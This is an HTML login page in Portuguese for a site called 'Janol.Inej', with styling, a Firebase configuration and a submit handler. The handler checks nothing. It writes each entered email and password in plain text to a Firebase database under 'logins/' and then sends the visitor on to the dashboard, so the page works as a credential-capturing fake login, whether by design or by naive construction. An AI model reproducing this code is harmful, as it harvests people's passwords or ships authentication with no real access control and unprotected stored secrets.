<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Janol.Inej</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }

        body {
            background: linear-gradient(135deg, #2c3e50, #4b79a1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-card {
            width: 100%;
            max-width: 420px;
            background: white;
            padding: 45px 35px;
            border-radius: 18px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
            animation: fadeIn .5s ease-out;
            text-align: center;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            font-size: 2.4em;
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 5px;
        }

        .subtitle {
            color: #7f8c8d;
            font-size: 15px;
            margin-bottom: 30px;
        }

        .form-group { text-align:left; margin-bottom:20px; }

        label {
            font-weight:600;
            color:#2c3e50;
            margin-bottom:8px;
            display:block;
        }

        input {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: 2px solid #dce1e6;
            font-size: 15px;
            transition: .3s;
        }

        input:focus {
            border-color:#3498db;
            box-shadow:0 0 0 3px rgba(52,152,219,0.15);
            outline:none;
        }

        .btn-login {
            width:100%;
            padding:15px;
            background:linear-gradient(135deg,#3498db,#2980b9);
            color:white;
            border:none;
            border-radius:12px;
            font-size:16px;
            font-weight:600;
            cursor:pointer;
            transition:.3s;
            margin-top:10px;
        }

        .btn-login:hover {
            transform:translateY(-2px);
            box-shadow:0 10px 20px rgba(52,152,219,0.35);
        }

        .links {
            margin-top:25px;
        }

        .links a {
            display:block;
            text-decoration:none;
            color:#3498db;
            margin:8px 0;
            transition:.3s;
        }

        .links a:hover { opacity:.75; }
    </style>
</head>

<body>

    <div class="login-card">
        <div class="logo">üèóÔ∏è JANOL.INEJ</div>
        <div class="subtitle">Acesso ao Sistema - √Årea Restrita</div>

        <form id="loginForm">
            <div class="form-group">
                <label>üìß Email</label>
                <input type="email" id="email" placeholder="email@exemplo.com" required>
            </div>

            <div class="form-group">
                <label>üîí Senha</label>
                <input type="password" id="senha" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" required>
            </div>

            <button type="submit" class="btn-login">üöÄ Entrar</button>
        </form>

        <div class="links">
            <a href="#">üîì Esqueci minha senha</a>
            <a href="dashboard.html">‚ñ∂Ô∏è Entrar como Visitante</a>
        </div>
    </div>

    <!-- FIREBASE -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCjdryEhdWNcWZpcIciZApYdZX5jXcST3A",
            authDomain: "janoline-7285c.firebaseapp.com",
            databaseURL: "https://janoline-7285c-default-rtdb.firebaseio.com",
            projectId: "janoline-7285c",
            storageBucket: "janoline-7285c.firebasestorage.app",
            messagingSenderId: "688131267684",
            appId: "1:688131267684:web:6a3d976a092512e1fad371",
            measurementId: "G-K767JLC4BP"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const form = document.getElementById("loginForm");
        const email = document.getElementById("email");
        const senha = document.getElementById("senha");

        form.addEventListener("submit", function(e) {
            e.preventDefault();

            const emailVal = email.value;
            const senhaVal = senha.value;

            set(ref(db, "logins/" + Date.now()), {
                email: emailVal,
                senha: senhaVal
            })
            .then(() => {
                window.location.href = "dashboard.html";
            })
            .catch(err => alert("Erro ao salvar: " + err));
        });
    </script>

</body>
</html>
